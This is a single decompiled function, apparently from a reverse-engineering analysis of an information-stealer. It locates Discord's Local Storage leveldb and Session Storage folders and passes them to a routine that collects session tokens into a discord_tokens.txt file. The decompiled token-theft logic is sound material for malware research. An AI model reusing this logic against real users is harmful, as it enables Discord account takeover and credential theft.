void *__thiscall vdr_enum_and_steal_discord_tokens(char *str_discord_folder_path)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  memset(sz_Discord, 0, sizeof(sz_Discord));
  memset(sz_Local_Storage, 0, sizeof(sz_Local_Storage));
  memset(sz_leveldb, 0, sizeof(sz_leveldb));
  memset(sz_CURRENT, 0, sizeof(sz_CURRENT));
  memset(sz_Session_Storage, 0, sizeof(sz_Session_Storage));
  memset(sz_discord_local_storage_current_path, 0, sizeof(sz_discord_local_storage_current_path));
  memset(sz_discord_leveldb_path, 0, sizeof(sz_discord_leveldb_path));
  memset(sz_discord_session_storage_current_path, 0, sizeof(sz_discord_session_storage_current_path));
  memset(sz_discord_session_storage_path, 0, sizeof(sz_discord_session_storage_path));
  lstrcatA(sz_Discord, str_Discord);
  lstrcatA(sz_Local_Storage, str_Local_Storage);
  lstrcatA(sz_leveldb, str_leveldb);
  lstrcatA(sz_CURRENT, str_CURRENT);
  lstrcatA(sz_Session_Storage, str_Session_Storage);
  lstrcatA(sz_discord_local_storage_current_path, str_discord_folder_path);
  lstrcatA(sz_discord_local_storage_current_path, L"\\");
  lstrcatA(sz_discord_local_storage_current_path, sz_Local_Storage);
  lstrcatA(sz_discord_local_storage_current_path, L"\\");
  lstrcatA(sz_discord_local_storage_current_path, sz_leveldb);
  lstrcatA(sz_discord_local_storage_current_path, L"\\");
  lstrcatA(sz_discord_local_storage_current_path, sz_CURRENT);
  lstrcatA(sz_discord_leveldb_path, str_discord_folder_path);
  lstrcatA(sz_discord_leveldb_path, L"\\");
  lstrcatA(sz_discord_leveldb_path, sz_Local_Storage);
  lstrcatA(sz_discord_leveldb_path, L"\\");
  lstrcatA(sz_discord_leveldb_path, sz_leveldb);
  lstrcatA(sz_discord_session_storage_current_path, str_discord_folder_path);
  lstrcatA(sz_discord_session_storage_current_path, L"\\");
  lstrcatA(sz_discord_session_storage_current_path, sz_Session_Storage);
  lstrcatA(sz_discord_session_storage_current_path, L"\\");
  lstrcatA(sz_discord_session_storage_current_path, sz_CURRENT);
  lstrcatA(sz_discord_session_storage_path, str_discord_folder_path);
  lstrcatA(sz_discord_session_storage_path, L"\\");
  lstrcatA(sz_discord_session_storage_path, sz_Session_Storage);
  v2 = GetFileAttributesA(sz_discord_local_storage_current_path);
  if ( v2 != INVALID_FILE_ATTRIBUTES && !(v2 & FILE_ATTRIBUTE_DIRECTORY) )
  {
    str_discord_folder_path = &v5;
    std::string::string(&v5, sz_Discord);
    vdr_enum_files_and_save_to_discord_tokens_txt(sz_discord_leveldb_path);
  }
  v3 = GetFileAttributesA(sz_discord_session_storage_current_path);
  if ( v3 != INVALID_FILE_ATTRIBUTES && !(v3 & FILE_ATTRIBUTE_DIRECTORY) )
  {
    str_discord_folder_path = &v5;
    std::string::string(&v5, sz_Discord);
    vdr_enum_files_and_save_to_discord_tokens_txt(sz_discord_session_storage_path);
  }
  memset(sz_Discord, 0, sizeof(sz_Discord));
  memset(sz_Local_Storage, 0, sizeof(sz_Local_Storage));
  memset(sz_leveldb, 0, sizeof(sz_leveldb));
  memset(sz_CURRENT, 0, sizeof(sz_CURRENT));
  memset(sz_Session_Storage, 0, sizeof(sz_Session_Storage));
  memset(sz_discord_local_storage_current_path, 0, sizeof(sz_discord_local_storage_current_path));
  memset(sz_discord_leveldb_path, 0, sizeof(sz_discord_leveldb_path));
  memset(sz_discord_session_storage_current_path, 0, sizeof(sz_discord_session_storage_current_path));
  return memset(sz_discord_session_storage_path, 0, sizeof(sz_discord_session_storage_path));
}
